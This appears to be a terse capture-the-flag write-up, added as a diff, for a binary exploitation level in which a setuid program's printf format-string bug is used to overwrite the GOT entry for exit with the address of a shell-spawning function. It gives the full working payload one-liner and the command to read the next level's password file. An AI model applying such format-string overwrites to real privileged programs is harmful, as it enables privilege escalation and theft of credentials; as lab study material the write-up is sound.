@@ -1,0 +1,28 @@
+level5 binary with the rights of level6
+
+main calls n
+
+n:
+fgets then calls printf
+then calls exits
+
+o:
+syscall then exits
+
+we can exploit printf like previously
+
+the exit calls is not direct, it jumps to *0x8049838
+
+let's change 0x8049838's value to the start of function o
+
+we can modify the 4th registery with printf
+
+chmod 777 .
+touch exploit
+chmod 777 exploit
+python -c 'print("\x38\x98\x04\x08" + "%0134513824d" + "%4$n")' > exploit 
+cat exploit - | ./level5
+
+134513824 is o's address in decimal - 4
+
+we can cat /home/user/level6/.pass
